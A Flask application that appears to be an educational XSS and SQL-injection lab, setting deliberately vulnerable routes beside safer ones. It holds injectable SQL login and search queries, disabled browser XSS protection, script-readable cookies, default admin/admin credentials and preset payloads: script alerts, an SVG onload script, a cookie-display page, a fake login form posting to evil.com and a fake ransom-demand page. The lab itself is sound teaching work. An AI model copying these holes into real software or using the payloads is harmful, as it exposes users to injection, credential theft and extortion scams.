import os
import time
import sqlite3
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash, session, make_response, jsonify

app = Flask(__name__)
app.secret_key = 'super_secret_key'

app.config['SESSION_COOKIE_HTTPONLY'] = False 
app.config['SESSION_COOKIE_SECURE'] = False

# === ВИМИКАЄМО ЗАХИСТ БРАУЗЕРА (Щоб XSS точно працювали) ===
@app.after_request
def add_header(response):
    response.headers['X-XSS-Protection'] = '0'
    return response

LAST_DB_RESET = time.time()

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
DB_PATH = os.path.join(BASE_DIR, 'xss_lab.db')

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
# Дозволені розширення для "справжніх" файлів у захищеному режимі
SAFE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'txt'} 

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# --- ПРЕСЕТИ ---
PRESET_FILES = {
'test_alert.html': '<script>alert("XSS Successful!")</script><h1>HACKED</h1>',
    'evil_image.svg': '''<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg" onload="alert('XSS IN THE HOUSE!')">
        <polygon points="100,10 200,100 0,100" style="fill:brown;stroke:black;stroke-width:3" />
        <rect x="25" y="100" width="150" height="100" style="fill:yellow;stroke:black;stroke-width:3" />
        <rect x="80" y="140" width="40" height="60" style="fill:red;stroke:black;stroke-width:2" />
        <text x="20" y="230" font-family="Verdana" font-size="20" fill="black">Home Sweet XSS</text>
    </svg>''',
    'cookie_stealer.html': '''<body style="background:#222; color:#0f0; font-family:monospace;">
        <h1>COOKIE STEALER 3000</h1>
        <script>
            // Виводимо ВСІ кукі, які бачить браузер
            alert("VICTIM COOKIES FOUND:\\n\\n" + document.cookie);
            document.write("<h2>STOLEN DATA:</h2><hr>");
            document.write("<h3>" + document.cookie + "</h3>");
        </script>
    </body>''',
    'fake_login.html': '<h2>Session Expired</h2><form action="http://evil.com"><input placeholder="Password" type="password"><button>Login</button></form>',
    'red_screen.html': '<style>body{background:red!important;}</style><h1>RED SCREEN OF DEATH</h1>',
    'safe_note.txt': 'This is a safe text file. Nothing to worry about.',
    'calc.exe': 'FAKE BINARY CONTENT',
    'simulation_hack.html': '''<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM FAILURE</title>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; background-color: black; font-family: 'Courier New', monospace; user-select: none; }
        
        /* Фон з матрицею */
        #background-wrapper {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1;
        }
        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 0; }
        
        /* Логи терміналу */
        #terminal-log { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            padding: 20px; box-sizing: border-box; z-index: 10;
            display: flex; flex-direction: column; justify-content: flex-end; 
            pointer-events: none;
        }
        .log-line { color: #00ff00; font-size: 16px; font-weight: bold; text-shadow: 0 0 5px #00ff00; margin-bottom: 4px; opacity: 0.9; }

        /* Червоне вікно */
        #hacker-message-box { 
            display: none; 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95); border: 4px solid red; 
            padding: 40px; width: 90%; max-width: 900px; 
            text-align: center; box-shadow: 0 0 100px red; z-index: 9999; border-radius: 5px;
        }
        
        .hacker-text { 
            color: red; font-size: 28px; font-weight: bold; 
            text-shadow: 0 0 10px red; white-space: pre-wrap; line-height: 1.6;
            text-transform: uppercase; margin-bottom: 30px;
        }

        /* Таймер */
        #timer {
            font-size: 48px; color: #ff0000; font-weight: bold;
            text-shadow: 0 0 20px red; background-color: #220000;
            display: inline-block; padding: 10px 20px; border: 2px solid red;
            display: none;
        }
        
        /* Анімації */
        .shake-normal { animation: shake-bg 0.1s infinite; }
        @keyframes shake-bg { 
            0% { transform: translate(2px, 2px); } 25% { transform: translate(-2px, -2px); } 
            50% { transform: translate(-2px, 2px); } 75% { transform: translate(2px, -2px); } 
            100% { transform: translate(0px, 0px); } 
        }

        .shake-centered { animation: shake-center 0.08s infinite; }
        @keyframes shake-center { 
            0% { transform: translate(calc(-50% + 4px), calc(-50% + 4px)); } 
            25% { transform: translate(calc(-50% - 4px), calc(-50% - 4px)); } 
            50% { transform: translate(calc(-50% - 4px), calc(-50% + 4px)); } 
            75% { transform: translate(calc(-50% + 4px), calc(-50% - 4px)); } 
            100% { transform: translate(-50%, -50%); } 
        }
        
        /* Кнопка запуску звуку (для обходу політики браузера) */
        #start-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 99999; background: transparent; cursor: pointer;
        }
    </style>
</head>
<body>
    <!-- Невидимий шар для активації звуку при кліку -->
    <div id="start-overlay" onclick="enableAudio()"></div>

    <div id="background-wrapper">
        <canvas id="matrix"></canvas>
        <div id="terminal-log"></div>
    </div>
    
    <div id="hacker-message-box">
        <div id="typewriter" class="hacker-text"></div>
        <div id="timer">01:00:00</div>
    </div>

    <script>
        // --- 1. АУДІО СИСТЕМА (ВИПРАВЛЕНО) ---
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx = new AudioContext();
        let audioEnabled = false;

        function enableAudio() {
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }
            audioEnabled = true;
            document.getElementById('start-overlay').style.display = 'none';
        }

        // Звук друкування / басу
        function playEvilSound() {
            if (!audioEnabled) return;
            try {
                const osc1 = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                
                osc1.type = 'sawtooth';
                osc1.frequency.setValueAtTime(100, audioCtx.currentTime);
                osc1.frequency.exponentialRampToValueAtTime(30, audioCtx.currentTime + 0.3);
                
                gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
                
                osc1.connect(gain);
                gain.connect(audioCtx.destination);
                osc1.start();
                osc1.stop(audioCtx.currentTime + 0.3);
            } catch(e) {}
        }

        // Звук тікання таймера (ДОДАНО ВІДСУТНЮ ФУНКЦІЮ)
        function playTick() {
            if (!audioEnabled) return;
            try {
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'square';
                osc.frequency.value = 800;
                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.05);
            } catch(e) {}
        }

        // --- 2. МАТРИЦЯ ---
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        let matrixColor = '#0F0'; 
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; 
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = matrixColor; 
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);

        // --- 3. ЛОГИ ---
        const terminalLog = document.getElementById('terminal-log');
        const commands = [
            "Initializing root exploit...", "Loading kernel modules...", "Bypassing firewall rules (Port 443)...",
            "Handshake with remote host established.", "Accessing memory dump...", "Scanning for saved passwords...",
            "[SUCCESS] Found 'passwords.txt'", "[SUCCESS] Found 'cookies.sqlite'", "Decrypting RSA keys...",
            "Injecting payload to system32...", "Disabling Windows Defender...", "Disabling Antivirus...",
            "Uploading private data (15%)...", "Uploading private data (45%)...", "Uploading private data (89%)...",
            "Uploading private data (100%)... DONE.", "Formatting C:/ Drive simulation...", "Locking user interface...",
            "Establishing permanent backdoor...", "SYSTEM COMPROMISED."
        ];

        let lineIndex = 0;
        function addLogLine() {
            if (lineIndex < commands.length) {
                const line = document.createElement('div');
                line.className = 'log-line';
                const timestamp = new Date().toLocaleTimeString();
                line.innerText = `[${timestamp}] ${commands[lineIndex]}`;
                terminalLog.appendChild(line);
                lineIndex++;
                setTimeout(addLogLine, Math.random() * 100 + 30);
            } else {
                setTimeout(triggerFinale, 800);
            }
        }
        setTimeout(addLogLine, 500);

        // --- 4. ФУНКЦІЯ ТАЙМЕРА ---
        function startTimer() {
            const timerEl = document.getElementById('timer');
            timerEl.style.display = 'inline-block';
            
            let totalSeconds = 59 * 60 + 59; 
            
            setInterval(() => {
                if (totalSeconds <= 0) {
                    timerEl.innerText = "00:00:00";
                    timerEl.style.color = "black";
                    timerEl.style.backgroundColor = "red";
                    return;
                }
                
                totalSeconds--;
                let h = Math.floor(totalSeconds / 3600);
                let m = Math.floor((totalSeconds % 3600) / 60);
                let s = totalSeconds % 60;
                
                h = h < 10 ? '0' + h : h;
                m = m < 10 ? '0' + m : m;
                s = s < 10 ? '0' + s : s;
                
                timerEl.innerText = `${h}:${m}:${s}`;
                playTick(); // ТЕПЕР ЦЕ ПРАЦЮЄ
                
            }, 1000);
        }

        function triggerFinale() {
            terminalLog.style.display = 'none';
            matrixColor = '#FF0000';
            
            document.getElementById('background-wrapper').className = 'shake-normal';
            
            const box = document.getElementById('hacker-message-box');
            box.style.display = 'block';
            box.className = 'shake-centered'; 
            
            const text = "YOUR PC HAS BEEN HACKED.\\n\\nALL YOUR DATA IS ENCRYPTED.\\nDO NOT TURN OFF YOUR COMPUTER.\\n\\nSEND 1 BITCOIN TO UNLOCK.\\nTIME LEFT:";
            const typeWriter = document.getElementById('typewriter');
            let i = 0;
            
            function type() {
                if (i < text.length) {
                    const char = text.charAt(i);
                    typeWriter.textContent += char;
                    if (char !== '\\n' && i % 2 === 0) playEvilSound(); // Звук через раз, щоб не рипіло
                    i++;
                    setTimeout(type, 50);
                } else {
                    startTimer();
                }
            }
            type();
        }
    </script>
</body>
</html>'''
}

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row # Дозволяє звертатись до колонок по імені
    return conn

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, role TEXT DEFAULT 'user');''')
    cur.execute('''CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL);''')
    # Додаємо колонку is_sanitized для відображення
    cur.execute('''CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, filename TEXT NOT NULL, upload_type TEXT NOT NULL, is_sanitized BOOLEAN DEFAULT 0);''')
    
    cur.execute("SELECT * FROM users WHERE username = 'admin'")
    if not cur.fetchone():
        cur.execute("INSERT INTO users (username, password, role) VALUES ('admin', 'admin', 'admin')")
    conn.commit()
    conn.close()

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in SAFE_EXTENSIONS

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
                return jsonify({'status': 'error', 'message': 'Login required'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- ROUTES ---

@app.route('/uploads/<name>')
def download_file(name):
    return send_from_directory(app.config['UPLOAD_FOLDER'], name)

# Спеціальний маршрут для читання тексту безпечного файлу
@app.route('/read_content/<name>')
@login_required
def read_content(name):
    try:
        with open(os.path.join(app.config['UPLOAD_FOLDER'], name), 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return content
    except:
        return "Error reading file"

@app.route('/check_db_version')
def check_db_version():
    return jsonify({'version': LAST_DB_RESET})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_id' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection(); cur = conn.cursor()
        try:
            cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
            user = cur.fetchone()
            if user:
                session['user_id'] = user['id']; session['username'] = user['username']; session['role'] = user['role']
                resp = make_response(redirect(url_for('dashboard')))
                resp.set_cookie('secret_bank_account', '1000000_USD', httponly=False)
                return resp
            else: flash('Invalid credentials', 'danger')
        except Exception as e: flash(f'SQL Error: {e}', 'danger')
        conn.close()
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    if request.method == 'POST':
        content = request.form['content']
        conn = get_db_connection(); cur = conn.cursor()
        cur.execute('INSERT INTO comments (content) VALUES (?)', (content,))
        conn.commit(); conn.close()
        return jsonify({'status': 'success', 'message': 'Payload Saved!'})
    return render_template('xss.html', preset_files=PRESET_FILES.keys())

@app.route('/sqli', methods=['GET', 'POST'])
@login_required
def sqli():
    vuln_result, vuln_error, vuln_query = None, None, ""
    sec_result, sec_query = None, ""
    search_term = ""
    if request.method == 'POST':
        search_term = request.form.get('search', '')
        if search_term:
            conn = get_db_connection()
            try:
                cur = conn.cursor()
                vuln_query = f"SELECT id, username, role FROM users WHERE username LIKE '%{search_term}%'"
                cur.execute(vuln_query)
                vuln_result = cur.fetchall()
            except Exception as e: vuln_error = str(e)
            try:
                cur = conn.cursor()
                cur.execute("SELECT id, username, role FROM users WHERE username LIKE ?", (f'%{search_term}%',))
                sec_result = cur.fetchall()
            except: pass
            conn.close()
    return render_template('sqli.html', search_term=search_term, vuln_result=vuln_result, vuln_error=vuln_error, vuln_query=vuln_query, sec_result=sec_result, sec_query=sec_query)

@app.route('/stealth')
@login_required
def stealth():
    return render_template('stealth.html')

@app.route('/scan_file', methods=['POST'])
@login_required
def scan_file():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    content = file.read().lower()
    VIRUS_SIGNATURES = [b'script', b'alert', b'prompt', b'onerror', b'onload', b'eval', b'javascript']
    detected = [s.decode() for s in VIRUS_SIGNATURES if s in content]
    if detected: return jsonify({'status':'blocked', 'message':f'⛔ BLOCKED: {", ".join(detected)}'})
    return jsonify({'status':'clean', 'message':'✅ CLEAN'})

@app.route('/upload_vulnerable', methods=['POST'])
@login_required
def upload_vulnerable():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
    save_file_to_db(file.filename, 'vulnerable', False)
    return jsonify({'status':'warning', 'message':f'💀 {file.filename} Executed!'})

@app.route('/upload_secure', methods=['POST'])
@login_required
def upload_secure():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    
    filename = file.filename
    is_sanitized = False
    
    # САНІТИЗАЦІЯ: Якщо файл небезпечний, ми його не блокуємо, а перетворюємо на .txt
    if not allowed_file(filename):
        filename = filename + ".txt" # Перетворюємо скрипт на текст
        is_sanitized = True
        
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    save_file_to_db(filename, 'secure', is_sanitized)
    
    if is_sanitized:
        return jsonify({'status':'success', 'message':f'🛡️ Sanitized: {filename}'})
    return jsonify({'status':'success', 'message':f'✅ Uploaded: {filename}'})

@app.route('/upload_preset', methods=['POST'])
@login_required
def upload_preset():
    fname = request.form.get('filename')
    mode = request.form.get('mode')
    if fname not in PRESET_FILES: return jsonify({'status':'error'})
    
    content = PRESET_FILES[fname]
    is_sanitized = False
    
    # Логіка для захищеного режиму
    if mode == 'secure':
        if not allowed_file(fname):
            fname = fname + ".txt"
            is_sanitized = True
            
    with open(os.path.join(app.config['UPLOAD_FOLDER'], fname), 'w', encoding='utf-8') as f: 
        f.write(content)
    
    save_file_to_db(fname, mode, is_sanitized)
    return jsonify({'status':'success', 'message':f'Injected: {fname}'})

@app.route('/inject_all', methods=['POST'])
@login_required
def inject_all():
    for f, c in PRESET_FILES.items():
        with open(os.path.join(app.config['UPLOAD_FOLDER'], f), 'w', encoding='utf-8') as file: 
            file.write(c)
        save_file_to_db(f, 'vulnerable', False)
    return jsonify({'status':'warning', 'message':'ALL VIRUSES INJECTED'})

@app.route('/reset_db', methods=['POST'])
@login_required
def reset_db():
    global LAST_DB_RESET
    conn = get_db_connection(); cur = conn.cursor()
    try:
        cur.execute('DELETE FROM comments;')
        cur.execute('DELETE FROM files;')
        cur.execute("DELETE FROM sqlite_sequence WHERE name='comments';")
        cur.execute("DELETE FROM sqlite_sequence WHERE name='files';")
        conn.commit()
    except: conn.rollback()
    conn.close()
    for f in os.listdir(UPLOAD_FOLDER):
        fp = os.path.join(UPLOAD_FOLDER, f)
        if os.path.isfile(fp): os.remove(fp)
    LAST_DB_RESET = time.time()
    return jsonify({'status':'info', 'message':'DB Cleared'})

def save_file_to_db(name, type, sanitized):
    conn = get_db_connection(); cur = conn.cursor()
    # is_sanitized = 1 (True) або 0 (False)
    cur.execute('INSERT INTO files (filename, upload_type, is_sanitized) VALUES (?, ?, ?)', (name, type, 1 if sanitized else 0))
    conn.commit(); conn.close()

@app.route('/vulnerable')
def win_vuln():
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
    # Беремо останній файл для автозапуску
    cur.execute("SELECT filename FROM files WHERE upload_type='vulnerable' ORDER BY id DESC LIMIT 1"); 
    last_file = cur.fetchone()
    last_filename = last_file['filename'] if last_file else None
    
    conn.close()
    return render_template('vulnerable.html', comments=comms, last_file=last_filename)

@app.route('/secure')
def win_sec():
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
    
    # Беремо всі файли, а для санітизованих будемо читати контент
    cur.execute("SELECT filename, is_sanitized FROM files WHERE upload_type='secure' ORDER BY id DESC LIMIT 1"); 
    last_file_row = cur.fetchone()
    
    last_file = None
    file_content = None
    
    if last_file_row:
        last_file = last_file_row['filename']
        if last_file_row['is_sanitized']:
            # Читаємо файл, щоб показати код
            try:
                with open(os.path.join(app.config['UPLOAD_FOLDER'], last_file), 'r', encoding='utf-8', errors='ignore') as f:
                    file_content = f.read()
            except: file_content = "Error reading file"

    conn.close()
    return render_template('secure.html', comments=comms, last_file=last_file, file_content=file_content)

if __name__ == '__main__':
    app.run(debug=True)